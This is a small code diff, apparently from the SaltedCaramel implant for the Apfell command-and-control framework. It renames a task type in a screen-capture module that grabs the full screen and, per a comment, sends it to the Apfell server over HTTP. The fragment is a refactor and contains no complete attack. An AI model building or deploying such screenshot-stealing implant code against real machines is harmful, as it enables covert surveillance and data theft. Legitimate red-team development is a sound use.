@@ -12,7 +12,7 @@ namespace SaltedCaramel.Tasks
 {
     public class ScreenCapture
     {
-        public static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTask task, SCImplant implant)
         {
             Rectangle bounds = Screen.GetBounds(Point.Empty);
             Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
@@ -30,7 +30,7 @@ namespace SaltedCaramel.Tasks
 
 
         // Same workflow as sending a file to Apfell server, but we only use one chunk
-        private static void SendCapture(SCImplant implant, SCTaskObject task, byte[] screenshot)
+        private static void SendCapture(SCImplant implant, SCTask task, byte[] screenshot)
         {
             try // Try block for HTTP request
             {
